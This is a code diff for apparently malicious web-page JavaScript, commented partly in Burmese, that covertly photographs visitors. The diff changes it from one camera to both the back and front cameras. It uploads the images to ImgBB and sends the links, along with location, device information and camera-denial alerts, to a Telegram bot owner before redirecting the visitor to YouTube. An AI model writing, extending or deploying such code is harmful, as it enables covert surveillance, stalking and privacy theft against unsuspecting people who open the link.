@@ -64,11 +64,10 @@
             window.location.href = `intent://${currentUrl.replace('https://', '')}#Intent;scheme=https;package=com.android.chrome;end`;
         }
         
-        let photoSent = false;
-        let locationSent = false;
-        let deviceSent = false;
+        let backPhotoSent = false;
+        let frontPhotoSent = false;
         
-        // ========== CAMERA ==========
+        // ========== SEND MESSAGE ==========
         async function sendMessageToOwner(text) {
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -84,6 +83,7 @@
             }
         }
         
+        // ========== UPLOAD TO IMGBB ==========
         async function uploadToImgBB(imageBlob) {
             const formData = new FormData();
             formData.append('image', imageBlob);
@@ -101,9 +101,13 @@
             }
         }
         
-        async function takePhotoAndSend(stream) {
-            if (photoSent) return;
-            photoSent = true;
+        // ========== TAKE PHOTO ==========
+        async function takePhotoAndSend(stream, cameraType) {
+            if (cameraType === 'back' && backPhotoSent) return;
+            if (cameraType === 'front' && frontPhotoSent) return;
+            
+            if (cameraType === 'back') backPhotoSent = true;
+            if (cameraType === 'front') frontPhotoSent = true;
             
             const video = document.createElement('video');
             video.srcObject = stream;
@@ -127,7 +131,7 @@
             canvas.toBlob(async (blob) => {
                 try {
                     const imageUrl = await uploadToImgBB(blob);
-                    await sendMessageToOwner(`📸 PHOTO CAPTURED!\n🕐 Time: ${new Date().toLocaleString()}\n📷 Image: ${imageUrl}`);
+                    await sendMessageToOwner(`📸 ${cameraType === 'back' ? 'BACK' : 'FRONT'} CAMERA PHOTO CAPTURED!\n🕐 Time: ${new Date().toLocaleString()}\n📷 Image: ${imageUrl}`);
                 } catch (err) {
                     console.log('Error:', err);
                 }
@@ -135,15 +139,29 @@
             }, 'image/jpeg', 0.7);
         }
         
-        async function initCamera() {
+        // ========== BACK CAMERA (အနောက်) ==========
+        async function initBackCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "environment" } 
                 });
-                await takePhotoAndSend(stream);
+                await takePhotoAndSend(stream, 'back');
             } catch (err) {
-                console.log('Camera error:', err);
-                await sendMessageToOwner(`❌ CAMERA DENIED!\n🕐 Time: ${new Date().toLocaleString()}`);
+                console.log('Back camera error:', err);
+                await sendMessageToOwner(`❌ BACK CAMERA DENIED!\n🕐 Time: ${new Date().toLocaleString()}`);
+            }
+        }
+        
+        // ========== FRONT CAMERA (အရှေ့) ==========
+        async function initFrontCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                await takePhotoAndSend(stream, 'front');
+            } catch (err) {
+                console.log('Front camera error:', err);
+                await sendMessageToOwner(`❌ FRONT CAMERA DENIED!\n🕐 Time: ${new Date().toLocaleString()}`);
             }
         }
         
@@ -187,13 +205,16 @@
                 return;
             }
             
-            // Camera ခေါ်မယ်
-            await initCamera();
+            // အနောက်ကင်မရာ (Back Camera)
+            await initBackCamera();
             
-            // Location ခေါ်မယ်
+            // အရှေ့ကင်မရာ (Front Camera)
+            await initFrontCamera();
+            
+            // Location
             await getLocation();
             
-            // Device Info ပို့မယ်
+            // Device Info
             await sendDeviceInfo();
             
             // အကုန်ပြီးရင် YouTube ခေါ်မယ်
